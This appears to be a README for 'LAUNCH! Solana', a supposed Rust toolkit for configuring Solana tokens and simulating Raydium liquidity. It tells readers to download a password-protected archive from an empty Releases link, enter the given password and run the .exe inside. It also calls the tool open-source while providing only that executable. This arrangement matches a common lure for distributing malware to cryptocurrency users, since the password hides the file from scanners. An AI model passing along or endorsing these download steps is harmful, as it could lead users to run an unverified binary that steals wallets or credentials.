**LAUNCH! Solana** is an all-in-one toolkit for experimenting with custom assets and configurations on the **Solana blockchain**. It includes logic for configuring token parameters, simulating liquidity setups (e.g., with **Raydium**) and minimal overhead. Built in **Rust**, provided as a single native application for testing and educational use.

## 🛠 How to Get Started

**Download the latest build** from the [**Releases**]() page.

> ⚠️ the archive password is ***SOL!launch***.

Launch the `.exe` **Solana tool** to begin.

## ✨ Features Overview

- **Asset configuration support**
  - Define name, symbol, description, visual reference, and social metadata
  - Configure supply, decimals, and ownership settings

- **Built-in fee simulation**
  - Estimate network fees and convert values for reference (SOL ↔ USDT)
  - Manage permissions (`freeze`, `mint`, `update`) for testing decentralization options

- **Liquidity simulation**
  - Emulate pair setup on Raydium-like environments (e.g., SPMM / v4)
  - Include mock liquidity scenarios

- **Permission-oriented logic**
  - No direct on-chain interaction unless exported
  - Simulate decentralization paths based on user-defined rules

Free and open-source testing tool for exploring token configurations on Solana.
